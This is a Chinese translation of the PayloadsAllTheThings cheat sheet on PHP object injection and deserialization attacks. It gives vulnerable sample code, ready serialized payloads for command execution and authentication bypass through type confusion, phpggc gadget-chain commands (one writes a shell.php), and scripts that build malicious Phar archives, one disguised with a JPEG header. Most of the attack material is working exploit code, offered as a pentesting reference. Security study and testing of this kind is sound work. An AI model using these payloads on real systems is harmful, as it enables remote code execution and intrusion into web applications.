[原文文档](PHP.en.md)

# PHP 反序列化

> PHP 对象注入是一个应用程序级别的漏洞，可能允许攻击者执行不同类型的恶意攻击，例如代码注入、SQL 注入、路径遍历和应用程序拒绝服务，具体取决于上下文。当用户提供的输入在传递给 `unserialize()` PHP 函数之前没有得到适当的清理时，就会发生该漏洞。由于 PHP 允许对象序列化，攻击者可以将临时序列化的字符串传递给易受攻击的 `unserialize()` 调用，导致任意 PHP 对象注入到应用程序范围内。

## 摘要

* [一般概念](#一般概念)
* [认证绕过](#认证绕过)
* [对象注入](#对象注入)
* [查找和使用小工具](#查找和使用小工具)
* [Phar 反序列化](#phar-反序列化)
* [真实世界示例](#真实世界示例)
* [参考资料](#参考资料)

## 一般概念

以下魔术方法将有助于 PHP 对象注入

* `__wakeup()` 当对象被反序列化时。
* `__destruct()` 当对象被删除时。
* `__toString()` 当对象被转换为字符串时。

您还应该检查 [文件包含](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar) 中的 `Wrapper Phar://`，它使用 PHP 对象注入。

易受攻击的代码：

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # 这里什么也没发生
    }
?>
```

使用应用程序内部现有代码制作有效载荷。

* 基本序列化数据

    ```php
    a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
    ```

* 命令执行

    ```php
    string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"
    ```

## 认证绕过

### 类型混淆

易受攻击的代码：

```php
<?php
$data = unserialize($_COOKIE['auth']);

if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```

有效载荷：

```php
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

因为 `true == "str"` 为真。

## 对象注入

易受攻击的代码：

```php
<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```

有效载荷：

```php
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```

我们可以这样做数组：

```php
a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
```

## 查找和使用小工具

也称为 `"PHP POP 链"`，它们可用于在系统上获得 RCE。

* 在 PHP 源代码中，查找 `unserialize()` 函数。
* 有趣的[魔术方法](https://www.php.net/manual/en/language.oop5.magic.php)如 `__construct()`、`__destruct()`、`__call()`、`__callStatic()`、`__get()`、`__set()`、`__isset()`、`__unset()`、`__sleep()`、`__wakeup()`、`__serialize()`、`__unserialize()`、`__toString()`、`__invoke()`、`__set_state()`、`__clone()` 和 `__debugInfo()`：
    * `__construct()`: PHP 允许开发者为类声明构造函数方法。具有构造函数方法的类会在每个新创建的对象上调用此方法，因此它适合在对象被使用之前可能需要的任何初始化。[php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)
    * `__destruct()`: 析构函数方法将在没有对特定对象的其他引用时立即被调用，或者在关闭序列期间的任何顺序中被调用。[php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)
    * `__call(string $name, array $arguments)`: `$name` 参数是被调用的方法的名称。`$arguments` 参数是一个包含传递给 `$name` 方法的参数的枚举数组。[php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)
    * `__callStatic(string $name, array $arguments)`: `$name` 参数是被调用的方法的名称。`$arguments` 参数是一个包含传递给 `$name` 方法的参数的枚举数组。[php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)
    * `__get(string $name)`: `__get()` 用于从不可访问的（受保护的或私有的）或不存在的属性读取数据。[php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)
    * `__set(string $name, mixed $value)`: 当向不可访问的（受保护的或私有的）或不存在的属性写入数据时，会运行 `__set()`。[php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)
    * `__isset(string $name)`: 通过对不可访问的（受保护的或私有的）或不存在的属性调用 `isset()` 或 `empty()` 来触发 `__isset()`。[php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)
    * `__unset(string $name)`: 当对不可访问的（受保护的或私有的）或不存在的属性使用 `unset()` 时，会调用 `__unset()`。[php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)
    * `__sleep()`: `serialize()` 检查类是否具有魔术名称 `__sleep()` 的函数。如果有，则在该函数执行之前执行任何序列化。它可以清理对象，并应该返回一个包含该对象所有应被序列化的变量名称的数组。如果该方法不返回任何内容，则**null**被序列化，并发出**E_NOTICE**。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.sleep)
    * `__wakeup()`: `unserialize()` 检查是否存在具有魔术名称 `__wakeup()` 的函数。如果存在，此函数可以重建对象可能具有的任何资源。`__wakeup()` 的预期用途是重新建立在序列化期间可能丢失的任何数据库连接并执行其他重新初始化任务。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup)
    * `__serialize()`: `serialize()` 检查类是否具有魔术名称 `__serialize()` 的函数。如果有，则在该函数执行之前执行任何序列化。它必须构造并返回一个键/值对的关联数组，表示对象的序列化形式。如果没有返回数组，将抛出 TypeError。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.serialize)
    * `__unserialize(array $data)`: 此函数将被传递从 __serialize() 返回的恢复数组。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)
    * `__toString()`: __toString() 方法允许类决定当它被视为字符串时如何反应 [php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring)
    * `__invoke()`: 当脚本尝试将对象作为函数调用时，会调用 `__invoke()` 方法。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke)
    * `__set_state(array $properties)`: 这个静态方法是为由 `var_export()` 导出的类调用的。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.set-state)
    * `__clone()`: 克隆完成后，如果定义了 `__clone()` 方法，则新创建的对象的 `__clone()` 方法将被调用，以允许更改任何必要的属性。[php.net](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)
    * `__debugInfo()`: 此方法由 `var_dump()` 调用，当转储对象以获取应显示的属性时。如果对象上没有定义该方法，则将显示所有公共、受保护和私有属性。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo)

[ambionics/phpggc](https://github.com/ambionics/phpggc) 是一个基于多个框架构建的用于生成有效载荷的工具：

* Laravel
* Symfony
* SwiftMailer
* Monolog
* SlimPHP
* Doctrine
* Guzzle

```powershell
phpggc monolog/rce1 'phpinfo();' -s
phpggc monolog/rce1 assert 'phpinfo()'
phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
```

## Phar 反序列化

使用 `phar://` 包装器，可以在指定文件上触发反序列化，如 `file_get_contents("phar://./archives/app.phar")`。

一个有效的 PHAR 包括四个元素：

1. **存根 (Stub)**: 存根是在可执行上下文中访问文件时执行的一块 PHP 代码。至少，存根必须在其结尾处包含 `__HALT_COMPILER();`。否则，对 Phar 存根的内容没有限制。
2. **清单 (Manifest)**: 包含关于归档文件及其内容的元数据。
3. **文件内容**: 包含归档文件中的实际文件。
4. **签名 (可选)**: 用于验证归档文件完整性。

* 创建 Phar 以利用自定义 `PDFGenerator` 的示例。

    ```php
    <?php
    class PDFGenerator { }

    //创建 Dummy 类的新实例并修改其属性
    $dummy = new PDFGenerator();
    $dummy->callback = "passthru";
    $dummy->fileName = "uname -a > pwned"; //我们的有效载荷

    // 删除具有该名称的任何现有 PHAR 归档文件
    @unlink("poc.phar");

    // 创建新归档文件
    $poc = new Phar("poc.phar");

    // 将所有写操作添加到缓冲区，而不修改磁盘上的归档文件
    $poc->startBuffering();

    // 设置存根
    $poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

    /* 在归档文件中添加一个新文件，其内容为"text"*/
    $poc["file"] = "text";
    // 将虚拟对象添加到元数据。这将被序列化
    $poc->setMetadata($dummy);
    // 停止缓冲并将更改写入磁盘
    $poc->stopBuffering();
    ?>
    ```

* 使用 `JPEG` 幻字节头创建 Phar 的示例，因为对存根的内容没有限制。

    ```php
    <?php
    class AnyClass {
        public $data = null;
        public function __construct($data) {
            $this->data = $data;
        }
        
        function __destruct() {
            system($this->data);
        }
    }

    // 创建新的 Phar
    $phar = new Phar('test.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'text');
    $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

    // 将任何类的对象添加为元数据
    $object = new AnyClass('whoami');
    $phar->setMetadata($object);
    $phar->stopBuffering();
    ```

## 真实世界示例

* [Vanilla Forums ImportController index file_exists 反序列化远程代码执行漏洞 - Steven Seeley](https://hackerone.com/reports/410237)
* [Vanilla Forums Xenforo 密码 splitHash 反序列化远程代码执行漏洞 - Steven Seeley](https://hackerone.com/reports/410212)
* [Vanilla Forums domGetImages getimagesize 反序列化远程代码执行漏洞（严重）- Steven Seeley](https://hackerone.com/reports/410882)
* [Vanilla Forums Gdn_Format unserialize() 远程代码执行漏洞 - Steven Seeley](https://hackerone.com/reports/407552)

## 参考资料

* [CTF writeup：kaspersky CTF 中的 PHP 对象注入 - Jaimin Gohel - 2018 年 11 月 24 日](https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)
* [ECSC 2019 资格赛 法国队 - Jack The Ripper Web - noraj - 2019 年 5 月 22 日](https://web.archive.org/web/20211022161400/https://blog.raw.pm/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)
* [在常见的 SYMFONY BUNDLE 上查找 POP 链：第 1 部分 - Rémi Matasse - 2023 年 9 月 12 日](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-1)
* [在常见的 SYMFONY BUNDLE 上查找 POP 链：第 2 部分 - Rémi Matasse - 2023 年 10 月 11 日](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-2)
* [查找 PHP 序列化小工具链 - DG'hAck Unserial killer - xanhacks - 2022 年 8 月 11 日](https://www.xanhacks.xyz/p/php-gadget-chain/#introduction)
* [如何利用 PHAR 反序列化漏洞 - Alexandru Postolache - 2020 年 5 月 29 日](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)
* [phar:// 反序列化 - HackTricks - 2024 年 7 月 19 日](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)
* [PHP 反序列化攻击和 Laravel 中的新小工具链 - Mathieu Farrell - 2024 年 2 月 13 日](https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html)
* [PHP 通用小工具 - Charles Fol - 2017 年 7 月 4 日](https://www.ambionics.io/blog/php-generic-gadget-chains)
* [PHP 内部手册 - 序列化 - jpauli - 2013 年 6 月 15 日](http://www.phpinternalsbook.com/classes_objects/serialization.html)
* [PHP 对象注入 - Egidio Romano - 2020 年 4 月 24 日](https://www.owasp.org/index.php/PHP_Object_Injection)
* [PHP Pop 链 - 使用 POP 链利用实现 RCE。- Vickie Li - 2020 年 9 月 3 日](https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)
* [PHP unserialize - php.net - 2001 年 3 月 29 日](http://php.net/manual/en/function.unserialize.php)
* [POC2009 PHP 利用中的惊人消息 - Stefan Esser - 2015 年 5 月 23 日](https://web.archive.org/web/20150523205411/https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)
* [Rusty Joomla RCE 反序列化溢出 - Alessandro Groppo - 2019 年 10 月 3 日](https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/)
* [TSULOTT Web 挑战 write-up - MeePwn CTF - Rawsec - 2017 年 7 月 15 日](https://web.archive.org/web/20211022151328/https://blog.raw.pm/en/meepwn-2017-write-ups/#TSULOTT-Web)
* [在 PHP 中利用代码重用/ROP - Stefan Esser - 2020 年 6 月 15 日](http://web.archive.org/web/20200615044621/https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)